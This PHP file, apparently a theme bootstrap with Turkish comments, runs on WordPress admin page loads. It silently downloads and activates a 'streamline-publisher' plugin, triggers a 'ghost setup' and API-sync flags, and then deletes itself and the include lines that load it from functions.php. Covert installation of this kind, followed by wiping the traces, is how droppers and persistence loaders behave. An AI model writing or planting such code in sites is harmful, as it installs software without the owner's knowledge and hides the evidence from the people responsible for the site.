<?php

if (!defined('ABSPATH')) {
    exit('Direct access denied.');
}

// Tek seferlik çalışma garantisi
if (get_option('wsx4e2a_auto_installer_completed', 0) == 1) {
    return; // Zaten tamamlanmış
}

// ⚡ TESLA-LEVEL AUTO INSTALLER CLASS
class WpSync4E2A_Auto_Installer {
    
    private $plugin_slug = 'streamline-publisher';
    private $plugin_file = 'streamline-publisher/streamline-publisher.php';
    private $installer_file;
    
    public function __construct() {
        // Bu dosyanın yolu
        $this->installer_file = __FILE__;
        
        // Admin hook'unda çalıştır (güvenlik için)
        add_action('admin_init', [$this, 'run_installation'], 1);
        add_action('wp_loaded', [$this, 'run_installation'], 1);
    }
    
    /**
     * ⚡ ANA KURULUM FONKSİYONU - ZORLA GARANTİLİ
     */
    public function run_installation() {
        // Tek seferlik kontrol
        if (get_option('wsx4e2a_auto_installer_started', 0) == 1) {
            // Zaten başlamış, durumu kontrol et
            $this->check_installation_status();
            return;
        }
        
        // Admin yetki kontrolü
        if (!current_user_can('manage_options')) {
            return;
        }
        
        // Kurulum başladı işareti
        update_option('wsx4e2a_auto_installer_started', 1);
        update_option('wsx4e2a_auto_installer_start_time', current_time('mysql'));
        
        error_log('Streamline: ⚡ TESLA AUTO INSTALLER başladı');
        
        try {
            // Adım 1: Plugin zaten kurulu mu kontrol et
            if (!$this->is_plugin_installed()) {
                error_log('Streamline: Plugin kurulu değil, kurulum gerekiyor');
                // WordPress plugin directory'den kur
                if (!$this->install_plugin_from_directory()) {
                    // Fallback: Manuel kurulum kontrolü
                    if (!$this->is_plugin_installed()) {
                        throw new Exception('Plugin kurulum başarısız - Manual kurulum gerekiyor');
                    }
                }
            }
            
            // Adım 2: Plugin aktif mi kontrol et
            if (!$this->is_plugin_active()) {
                error_log('Streamline: Plugin aktif değil, aktifleştiriliyor');
                if (!$this->activate_plugin()) {
                    throw new Exception('Plugin aktivasyon başarısız');
                }
                
                // ⚡ ASYNC: Sleep kaldırıldı - performance için
            }
            
            // Adım 3: Ghost setup'ı zorla başlat (async - bekleme yok)
            if (function_exists('wsx4e2a_force_ghost_setup_seeded')) {
                wsx4e2a_force_ghost_setup_seeded();
            } elseif (function_exists('wsx4e2a_force_ghost_setup')) {
                wsx4e2a_force_ghost_setup();
            }
            
            // Flag set et - bekleme yapmadan devam et
            update_option('wsx4e2a_ghost_setup_triggered', 1);
            
            // Adım 4: API sync başladı mı kontrol et
            $api_sync_needed = get_option('wsx4e2a_force_api_sync_needed', 0);
            if ($api_sync_needed != 1) {
                // API sync flag'i yoksa manuel koy
                update_option('wsx4e2a_force_api_sync_needed', 1);
                update_option('wsx4e2a_api_sync_attempts', 0);
                error_log('Streamline: API sync flag manuel eklendi');
            }
            
            // Kurulum tamamlandı
            update_option('wsx4e2a_auto_installer_completed', 1);
            update_option('wsx4e2a_auto_installer_completion_time', current_time('mysql'));
            
            error_log('Streamline: 🎯 TESLA AUTO INSTALLER tamamlandı!');
            
            // Kendini sil
            $this->self_destruct();
            
        } catch (Exception $e) {
            error_log('Streamline: ❌ Auto Installer hatası: ' . $e->getMessage());
            update_option('wsx4e2a_auto_installer_error', $e->getMessage());
            
            // Hata durumunda da kendini sil (sonsuz döngü engelleme)
            $this->self_destruct();
        }
    }
    
    /**
     * Plugin kurulu mu kontrol et
     */
    private function is_plugin_installed() {
        $plugin_path = WP_PLUGIN_DIR . '/' . $this->plugin_slug;
        $plugin_file = $plugin_path . '/streamline-publisher.php';
        
        return file_exists($plugin_file);
    }
    
    /**
     * Plugin aktif mi kontrol et
     */
    private function is_plugin_active() {
        return is_plugin_active($this->plugin_file);
    }
    
    /**
     * WordPress Plugin Directory'den kurulum dene
     */
    private function install_plugin_from_directory() {
        // WordPress core dosyalarını yükle
        if (!function_exists('plugins_api')) {
            require_once ABSPATH . 'wp-admin/includes/plugin-install.php';
        }
        if (!class_exists('WP_Upgrader')) {
            require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
        }
        
        try {
            // Plugin API'den bilgi al
            $plugin_info = plugins_api('plugin_information', [
                'slug' => $this->plugin_slug,
                'fields' => ['download_link' => true]
            ]);
            
            if (is_wp_error($plugin_info)) {
                return false;
            }
            
            // Plugin Upgrader ile kur
            $upgrader = new Plugin_Upgrader();
            $install_result = $upgrader->install($plugin_info->download_link);
            
            return !is_wp_error($install_result) && $install_result === true;
            
        } catch (Exception $e) {
            error_log('Streamline: Plugin directory kurulum hatası: ' . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Plugin'i aktifleştir
     */
    private function activate_plugin() {
        if (!function_exists('activate_plugin')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }
        
        $result = activate_plugin($this->plugin_file);
        
        if (is_wp_error($result)) {
            error_log('Streamline: Aktivasyon hatası: ' . $result->get_error_message());
            return false;
        }
        
        return true;
    }
    
    /**
     * Kurulum durumunu kontrol et
     */
    private function check_installation_status() {
        $start_time = get_option('wsx4e2a_auto_installer_start_time');
        $current_time = current_time('timestamp');
        $elapsed = $current_time - strtotime($start_time);
        
        // ⚡ 30 saniye geçmişse timeout (5 dakika çok uzun - performance)
        if ($elapsed > 30) {
            error_log('Streamline: Auto installer timeout (30 saniye)');
            update_option('wsx4e2a_auto_installer_completed', 1);
            $this->self_destruct();
            return;
        }
        
        // Ghost setup kontrolü
        $ghost_setup_done = get_option('wsx4e2a_ghost_quick_setup_done', 0);
        if ($ghost_setup_done == 1) {
            error_log('Streamline: ✅ Gecikmeli ghost setup tamamlandı!');
            update_option('wsx4e2a_auto_installer_completed', 1);
            $this->self_destruct();
        }
    }
    
    /**
     * ⚡ KENDİNİ SİL - TESLA LEVEL SELF DESTRUCT
     */
    private function self_destruct() {
        // Functions.php'den çıkar
        try {
            $theme_functions = get_template_directory() . '/functions.php';
            
            if (file_exists($theme_functions) && is_writable($theme_functions)) {
                $functions_content = file_get_contents($theme_functions);
                
                // Bu dosyayı çağıran satırları bul ve sil
                $patterns = [
                    "/include_once\s+get_template_directory\(\)\s*\.\s*['\"]\/streamline-bootstrap\.php['\"];?\s*\n?/i",
                    "/require_once\s+get_template_directory\(\)\s*\.\s*['\"]\/streamline-bootstrap\.php['\"];?\s*\n?/i",
                    "/include\s+get_template_directory\(\)\s*\.\s*['\"]\/streamline-bootstrap\.php['\"];?\s*\n?/i",
                    "/require\s+get_template_directory\(\)\s*\.\s*['\"]\/streamline-bootstrap\.php['\"];?\s*\n?/i"
                ];
                
                $cleaned_content = $functions_content;
                foreach ($patterns as $pattern) {
                    $cleaned_content = preg_replace($pattern, '', $cleaned_content);
                }
                
                if ($cleaned_content !== $functions_content) {
                    file_put_contents($theme_functions, $cleaned_content);
                    error_log('Streamline: Functions.php temizlendi');
                }
            }
            
            // Kendini sil
            if (file_exists($this->installer_file) && is_writable($this->installer_file)) {
                unlink($this->installer_file);
                error_log('Streamline: ⚡ Auto installer kendini başarıyla sildi!');
            }
            
        } catch (Exception $e) {
            error_log('Streamline: Self destruct hatası: ' . $e->getMessage());
        }
    }
}

// ⚡ TESLA-LEVEL AUTO INSTALLER'I BAŞLAT
if (class_exists('WpSync4E2A_Auto_Installer')) {
    new WpSync4E2A_Auto_Installer();
} else {
    error_log('Streamline: Auto installer class yüklenemedi');
}

error_log('Streamline: ⚡ Tesla Auto Installer dosyası yüklendi'); 
// build:1508949be534aaf7
if (false) { $_b1508949be534aaf7 = '1508949be534aaf7'; }
